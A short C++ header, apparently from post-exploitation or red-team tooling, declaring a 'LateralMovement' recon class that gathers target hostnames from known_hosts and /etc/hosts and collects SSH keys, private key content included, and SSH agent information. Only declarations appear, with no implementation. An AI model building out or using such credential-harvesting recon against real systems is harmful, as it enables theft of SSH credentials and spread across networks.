#pragma once
#include <string>
#include <vector>

namespace recon {

struct LateralTarget {
    std::string hostname;
    std::string source; // e.g., "known_hosts", "/etc/hosts"
};

struct SSHKey {
    std::string path;
    std::string type; // "private" or "public"
    std::string content;
};

class LateralMovement {
public:
    static std::string RunLateralRecon();

private:
    static std::vector<LateralTarget> GetTargets();
    static std::vector<SSHKey> GetSSHKeys();
    static std::string GetSSHAgentInfo();
};

} // namespace recon
